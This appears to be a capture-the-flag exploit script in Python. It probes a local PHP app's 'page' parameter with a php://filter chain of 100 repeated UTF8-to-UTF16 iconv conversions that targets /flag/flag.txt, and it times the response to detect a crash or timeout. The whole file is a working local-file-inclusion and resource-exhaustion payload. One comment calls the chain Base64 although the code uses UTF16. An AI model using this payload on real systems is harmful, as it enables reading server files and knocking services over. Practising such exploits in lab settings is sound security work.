
import requests
import time

URL = "http://localhost:9051/index.php"

def make_chain(n):
    # Uses UTF8.UTF16 to double size N times.
    # 2^20 ~ 1MB. 2^28 ~ 256MB.
    # We use 30 to be sure.
    filters = "|".join(["convert.iconv.UTF8.UTF16"] * n) 
    return f"php://filter/read={filters}/resource=/flag/flag.txt"

def test():
    print("[*] Testing baseline request...")
    start = time.time()
    r = requests.post(URL, data={'page': 'home.php'})
    print(f"Status: {r.status_code}, Time: {time.time() - start:.4f}s")
    
    print("\n[*] Testing 'Heavy' payload (100x Base64)...")
    payload = make_chain(100)
    # The payload string itself is long, hopefully handled by POST
    start = time.time()
    try:
        r = requests.post(URL, data={'page': payload}, timeout=5)
        print(f"Status: {r.status_code}, Time: {time.time() - start:.4f}s")
        if r.status_code == 200:
            print("Response len:", len(r.text))
    except Exception as e:
        print(f"CRASH/TIMEOUT! ({e})")

if __name__ == "__main__":
    test()
